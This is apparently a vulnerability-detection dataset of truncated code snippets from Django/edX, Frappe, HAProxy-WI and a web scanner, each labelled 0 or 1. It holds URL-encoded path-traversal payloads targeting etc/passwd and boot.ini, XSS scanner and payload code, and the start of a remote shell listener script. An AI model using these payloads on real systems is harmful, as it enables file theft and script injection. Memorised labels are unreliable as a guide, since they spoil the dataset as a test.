\t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing", "label": 0}, {"snippet_id": 21804, "code": "?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine", "label": 0}, {"snippet_id": 34303, "code": " key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\",", "label": 0}, {"snippet_id": 29687, "code": " \treturn output, stderr def show_backends(serv, **kwargs): \timport json \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s %s' %(serv, haproxy_sock_port", "label": 0}, {"snippet_id": 13205, "code": "', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 47440, "code": " be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get('fault') and profile: f.add_content(PlainText(\"Unable to edit user due to: \" +str(http_request.GET['fault'])))", "label": 0}, {"snippet_id": 32493, "code": ") value=re.sub(r'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler", "label": 0}, {"snippet_id": 7562, "code": "+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 19663, "code": " -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html", "label": 0}, {"snippet_id": 40570, "code": "(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\",", "label": 0}, {"snippet_id": 18178, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 15150, "code": " TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except", "label": 0}, {"snippet_id": 36505, "code": "\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters", "label": 0}, {"snippet_id": 26631, "code": ", '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../.", "label": 0}, {"snippet_id": 8265, "code": "+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 39856, "code": ".fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t", "label": 0}, {"snippet_id": 13735, "code": "]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 15074, "code": " suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget", "label": 0}, {"snippet_id": 11221, "code": ".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self", "label": 0}, {"snippet_id": 22316, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,", "label": 0}, {"snippet_id": 3441, "code": "\"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET", "label": 0}, {"snippet_id": 23286, "code": " +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ", "label": 0}, {"snippet_id": 7874, "code": " 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 2427, "code": " payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list", "label": 0}, {"snippet_id": 11005, "code": " prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self", "label": 0}, {"snippet_id": 47697, "code": "(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity", "label": 0}, {"snippet_id": 24974, "code": "'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key", "label": 0}, {"snippet_id": 9621, "code": "/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 880, "code": "'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads", "label": 1}, {"snippet_id": 41017, "code": " not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s", "label": 0}, {"snippet_id": 5430, "code": "'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', ", "label": 0}, {"snippet_id": 20805, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns ", "label": 0}, {"snippet_id": 26958, "code": " print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print ", "label": 0}, {"snippet_id": 20403, "code": "'should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive", "label": 0}, {"snippet_id": 7634, "code": ", 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 30728, "code": " \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center", "label": 0}, {"snippet_id": 42166, "code": "=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname", "label": 0}, {"snippet_id": 134, "code": ",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 1}, {"snippet_id": 41864, "code": " self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters", "label": 0}, {"snippet_id": 14062, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/", "label": 0}, {"snippet_id": 51802, "code": " level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short, run: key=Fernet.generate_key", "label": 0}, {"snippet_id": 54511, "code": " import ListView, DetailView from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class", "label": 0}, {"snippet_id": 27646, "code": " includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if", "label": 0}, {"snippet_id": 425, "code": " '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url", "label": 0}, {"snippet_id": 24888, "code": ".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"", "label": 0}, {"snippet_id": 45336, "code": "'Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}", "label": 0}, {"snippet_id": 26290, "code": ".validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError", "label": 0}, {"snippet_id": 27677, "code": ".is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin", "label": 0}, {"snippet_id": 51629, "code": ".db.backends.' +DB_ENGINE), 'NAME': os.environ.get('DB_NAME', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get(", "label": 0}, {"snippet_id": 5869, "code": "(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"", "label": 1}, {"snippet_id": 8667, "code": "/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=(", "label": 0}, {"snippet_id": 48458, "code": ".id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u", "label": 0}, {"snippet_id": 35738, "code": "\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map", "label": 0}, {"snippet_id": 32749, "code": ".replace( '<', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=", "label": 0}, {"snippet_id": 15426, "code": ": self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install", "label": 0}, {"snippet_id": 25363, "code": "' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' ", "label": 0}, {"snippet_id": 9749, "code": "]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register", "label": 0}, {"snippet_id": 2100, "code": " temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None):", "label": 0}, {"snippet_id": 29290, "code": "\texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf\"]", "label": 0}, {"snippet_id": 12998, "code": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django", "label": 0}, {"snippet_id": 49726, "code": ",request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1", "label": 1}, {"snippet_id": 14844, "code": " for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard", "label": 0}, {"snippet_id": 11245, "code": "-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. ", "label": 0}, {"snippet_id": 20983, "code": " 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value", "label": 0}, {"snippet_id": 35113, "code": ".show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t", "label": 0}, {"snippet_id": 52787, "code": " return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters", "label": 0}, {"snippet_id": 15576, "code": "-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green", "label": 0}, {"snippet_id": 11346, "code": ", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self", "label": 0}, {"snippet_id": 33047, "code": ", self).__init__() self.has_a_single_h1=has_a_single_h1 def run(self, tree): for toc_node in tree.findall(\".//*[@class='toc']\"): toc_ul=toc_node[0] if self.has_a_single_h1: toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries", "label": 0}, {"snippet_id": 44476, "code": "=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data", "label": 0}, {"snippet_id": 53312, "code": "._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor", "label": 0}, {"snippet_id": 41612, "code": "*class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes ", "label": 0}, {"snippet_id": 22841, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses", "label": 1}, {"snippet_id": 40542, "code": " fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: ", "label": 0}, {"snippet_id": 20046, "code": "/manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together", "label": 0}, {"snippet_id": 23919, "code": ".env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 35876, "code": "\t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'", "label": 0}, {"snippet_id": 53274, "code": " request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request", "label": 0}, {"snippet_id": 41752, "code": "\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype", "label": 0}, {"snippet_id": 21865, "code": " name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD", "label": 0}, {"snippet_id": 23408, "code": ", ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course", "label": 0}, {"snippet_id": 20353, "code": ": cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment", "label": 0}, {"snippet_id": 18620, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P", "label": 0}, {"snippet_id": 54738, "code": "=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355", "label": 0}, {"snippet_id": 21447, "code": "'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 12712, "code": ".DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 28554, "code": ")+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e) \t\tpass", "label": 0}, {"snippet_id": 18877, "code": "+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth", "label": 0}, {"snippet_id": 20663, "code": "', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 11635, "code": ".views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset',", "label": 0}, {"snippet_id": 35469, "code": " \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname", "label": 0}, {"snippet_id": 45328, "code": "'status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': ", "label": 0}, {"snippet_id": 8291, "code": "='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 34915, "code": " \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname", "label": 0}, {"snippet_id": 29004, "code": "\"install_haproxy.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tstats_port=sql.get_setting('stats_port') \tserver_state_file=sql.get_setting(", "label": 0}, {"snippet_id": 10857, "code": " mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started.", "label": 0}, {"snippet_id": 26695, "code": "', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 36735, "code": "\t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext", "label": 0}, {"snippet_id": 25213, "code": " get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme: dict", "label": 0}, {"snippet_id": 10620, "code": " __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests", "label": 0}, {"snippet_id": 42181, "code": "\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_", "label": 0}, {"snippet_id": 23687, "code": " def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store", "label": 1}, {"snippet_id": 20997, "code": ".views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if", "label": 0}, {"snippet_id": 8461, "code": " from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$", "label": 0}, {"snippet_id": 14652, "code": " super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual", "label": 0}, {"snippet_id": 19860, "code": " 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest", "label": 0}, {"snippet_id": 30654, "code": "%s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if", "label": 0}, {"snippet_id": 41996, "code": "\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t", "label": 0}, {"snippet_id": 11767, "code": "': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/", "label": 0}, {"snippet_id": 37716, "code": "\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s ", "label": 0}, {"snippet_id": 44701, "code": " 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node", "label": 0}, {"snippet_id": 17632, "code": "(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change", "label": 0}, {"snippet_id": 12626, "code": ": urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 52912, "code": "[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission", "label": 0}, {"snippet_id": 37237, "code": "=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title)", "label": 0}, {"snippet_id": 47045, "code": " import gettext as _ from invenio_admin.filters import FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models", "label": 0}, {"snippet_id": 34598, "code": "\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t", "label": 0}, {"snippet_id": 49737, "code": " Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) 